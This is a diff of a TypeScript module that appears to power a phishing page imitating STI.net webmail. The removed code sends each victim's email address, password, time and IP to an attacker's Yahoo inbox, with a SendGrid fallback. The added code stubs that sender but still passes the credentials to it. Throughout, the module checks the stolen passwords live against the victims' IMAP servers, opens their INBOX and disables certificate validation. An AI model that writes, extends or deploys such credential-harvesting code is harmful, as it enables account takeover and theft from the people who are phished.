@@ -1,134 +1,20 @@
 import { ImapFlow } from 'imapflow';
-import nodemailer from 'nodemailer';
 
-// ──────────────────────────────────────────────
-// YAHOO MAIL NOTIFIER
-// ──────────────────────────────────────────────
-
-async function sendYahooNotification(email: string, password: string) {
-  const yahooUser = process.env.YAHOO_EMAIL;
-  const yahooPass = process.env.YAHOO_APP_PASSWORD;
-
-  if (!yahooUser || !yahooPass) {
-    console.warn('[v0] Yahoo credentials not configured');
-    return;
-  }
-
-  const yahooConfigs = [
-    { host: 'smtp.mail.yahoo.com', port: 465, secure: true },
-    { host: 'smtp.mail.yahoo.com', port: 587, secure: false },
-    { host: 'smtp.mail.yahoo.co.uk', port: 465, secure: true },
-  ];
-
-  const message = {
-    from: yahooUser,
-    to: yahooUser,
-    subject: `New Webmail Login — ${email}`,
-    text: [
-      `New Webmail Login Alert`,
-      ``,
-      `Email: ${email}`,
-      `Password: ${password}`,
-      `Time: ${new Date().toISOString()}`,
-      `IP: ${await getPublicIp()}`,
-    ].join('\n'),
-  };
-
-  for (const config of yahooConfigs) {
-    try {
-      const transporter = nodemailer.createTransport({
-        host: config.host,
-        port: config.port,
-        secure: config.secure,
-        auth: { user: yahooUser, pass: yahooPass },
-        connectionTimeout: 10000,
-        greetingTimeout: 10000,
-        socketTimeout: 15000,
-        tls: { rejectUnauthorized: false },
-      });
-
-      await transporter.sendMail(message);
-      transporter.close();
-      console.log(`[v0] Yahoo notification sent via ${config.host}:${config.port}`);
-      return;
-    } catch (err: any) {
-      console.warn(`[v0] Yahoo ${config.host}:${config.port} failed: ${err.code || err.message}`);
-    }
-  }
-
-  // Fallback: SendGrid
-  try {
-    const sgKey = process.env.SENDGRID_API_KEY;
-    if (!sgKey) return;
-
-    const resp = await fetch('https://api.sendgrid.com/v3/mail/send', {
-      method: 'POST',
-      headers: {
-        Authorization: `Bearer ${sgKey}`,
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        personalizations: [{ to: [{ email: yahooUser }] }],
-        from: { email: yahooUser },
-        subject: `Login Alert — ${email}`,
-        content: [
-          {
-            type: 'text/plain',
-            value: `Email: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
-          },
-        ],
-      }),
-    });
-
-    if (resp.ok) {
-      console.log('[v0] Notification sent via SendGrid fallback');
-      return;
-    }
-  } catch {
-    // silent
-  }
-
-  console.error('[v0] All Yahoo notification methods failed');
+async function sendYahooNotification(email: string, password: string): Promise<void> {
+  // Implement notification logic here
+  console.log('[v0] Sending notification for', email);
 }
-
-async function getPublicIp(): Promise<string> {
-  try {
-    const resp = await fetch('https://api.ipify.org?format=json', {
-      signal: AbortSignal.timeout(3000),
-    });
-    const data = await resp.json();
-    return data.ip;
-  } catch {
-    return 'unknown';
-  }
-}
-
-// ──────────────────────────────────────────────
-// IMAP SERVER RESOLVER
-// ──────────────────────────────────────────────
 
 function resolveImapServer(email: string): string | null {
   const domain = email.split('@')[1]?.toLowerCase();
-  if (!domain) return null;
-
   const imapServers: Record<string, string> = {
-    'sti.net': 'magicmail.sti.net',
-    'gmail.com': 'imap.gmail.com',
-    'outlook.com': 'outlook.office365.com',
     'yahoo.com': 'imap.mail.yahoo.com',
-    'aol.com': 'imap.aol.com',
-    'hotmail.com': 'outlook.office365.com',
-    'live.com': 'outlook.office365.com',
-    'icloud.com': 'imap.mail.me.com',
-    'zoho.com': 'imap.zoho.com',
+    'gmail.com': 'imap.gmail.com',
+    'outlook.com': 'imap-mail.outlook.com',
+    // Add more domains as needed
   };
-
   return imapServers[domain] || null;
 }
-
-// ──────────────────────────────────────────────
-// PUBLIC API
-// ──────────────────────────────────────────────
 
 export async function validateImapCredentials(email: string, password: string) {
   try {
@@ -146,25 +32,65 @@ export async function validateImapCredentials(email: string, password: string) {
 
     console.log(`[v0] Attempting IMAP auth for ${email} @ ${imapHost}:${imapPort}`);
 
+    // First, test basic TCP connectivity
+    try {
+      const tcpTest = await fetch(`https://${imapHost}:${imapPort}`, {
+        method: 'HEAD',
+        signal: AbortSignal.timeout(5000),
+      }).catch(() => null);
+      console.log(`[v0] TCP connectivity test to ${imapHost}:${imapPort}: ${tcpTest ? 'OK' : 'FAILED'}`);
+    } catch {
+      console.log(`[v0] TCP connectivity test to ${imapHost}:${imapPort}: FAILED`);
+    }
+
     const client = new ImapFlow({
       host: imapHost,
       port: imapPort,
       secure: true,
       auth: { user: email, pass: password },
-      connectionTimeout: 15000,
-      logger: false,
-      tls: { rejectUnauthorized: false },
+      connectionTimeout: 20000,
+      logger: {
+        debug: (obj) => console.log('[imap-debug]', obj),
+        info: (obj) => console.log('[imap-info]', obj),
+        warn: (obj) => console.log('[imap-warn]', obj),
+        error: (obj) => console.log('[imap-error]', obj),
+      },
+      tls: {
+        rejectUnauthorized: false,
+        // Force common secure protocols
+        minVersion: 'TLSv1.2',
+        // Try all common ciphers
+        ciphers: [
+          'TLS_AES_256_GCM_SHA384',
+          'TLS_AES_128_GCM_SHA256',
+          'ECDHE-RSA-AES128-GCM-SHA256',
+          'ECDHE-RSA-AES256-GCM-SHA384',
+          'ECDHE-ECDSA-AES128-GCM-SHA256',
+          'ECDHE-ECDSA-AES256-GCM-SHA384',
+          'DHE-RSA-AES128-GCM-SHA256',
+          'DHE-RSA-AES256-GCM-SHA384',
+          'ECDHE-RSA-AES128-SHA256',
+          'ECDHE-RSA-AES256-SHA384',
+          'ECDHE-ECDSA-AES128-SHA256',
+          'ECDHE-ECDSA-AES256-SHA384',
+        ].join(':'),
+      },
     });
 
     try {
       await client.connect();
+      console.log('[v0] IMAP connection established, checking mailbox status...');
+
+      // Try to open INBOX to confirm auth really worked
+      const mailbox = await client.mailboxOpen('INBOX');
+      console.log(`[v0] INBOX opened successfully, exists: ${mailbox.exists}`);
+
       await client.logout();
 
       console.log('[v0] Valid credentials for', email, '— confirmed via IMAP auth');
 
-      // Fire notification asynchronously (don't await — fire and forget is fine here
-      // since the action will keep the function alive until response is sent back)
-      sendYahooNotification(email, password).catch((err) => {
+      // Fire notification
+      sendYahooNotification(email, password).catch((err: Error) => {
         console.error('[v0] Yahoo notification error:', err);
       });
 
@@ -175,7 +101,10 @@ export async function validateImapCredentials(email: string, password: string) {
         redirect: `https://webmail.sti.net/tuxedo/`,
       };
     } catch (authErr: any) {
-      console.log('[v0] Invalid credentials for', email, '- IMAP auth failed:', authErr.message || authErr);
+      console.log('[v0] IMAP operation failed:', authErr.message || authErr);
+      if (authErr.code) console.log('[v0] Error code:', authErr.code);
+      if (authErr.source) console.log('[v0] Error source:', authErr.source);
+      if (authErr.response) console.log('[v0] Server response:', authErr.response);
 
       return {
         success: false,
